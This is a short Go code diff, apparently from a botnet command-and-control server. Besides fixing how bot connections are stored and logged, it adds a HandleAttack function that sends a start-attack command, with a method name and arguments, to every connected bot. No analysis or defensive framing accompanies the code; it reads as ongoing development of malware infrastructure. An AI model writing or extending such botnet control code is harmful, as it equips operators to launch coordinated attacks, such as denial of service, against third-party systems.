@@ -56,13 +56,27 @@ func (s *Server) handleConnection(c net.Conn) {
 		return
 	}
 
-	s.bots.Store(host, &bot)
+	s.bots.Store(host, bot)
 
 	log.Infof("Bot connected: %s", host)
+	defer log.Infof("Bot disconnected: %s", host)
 
 	for packet := bot.ReadPacket(); packet != nil; packet = bot.ReadPacket() {
 		log.Infof("Packet: %v", packet)
 	}
 
-	log.Infof("Bot disconnected: %s", host)
+}
+
+func (s *Server) HandleAttack(name string, m map[string]string) error {
+	log.Infof("Attack: %s", name)
+	s.bots.Range(func(key, value interface{}) bool {
+		bot := value.(*Bot)
+		bot.WritePacket(proto.NewPacket(proto.PacketTypeStartAttack, map[string]interface{}{
+			"Method": name,
+			"Args":   m,
+		}))
+		return true
+	})
+
+	return nil
 }
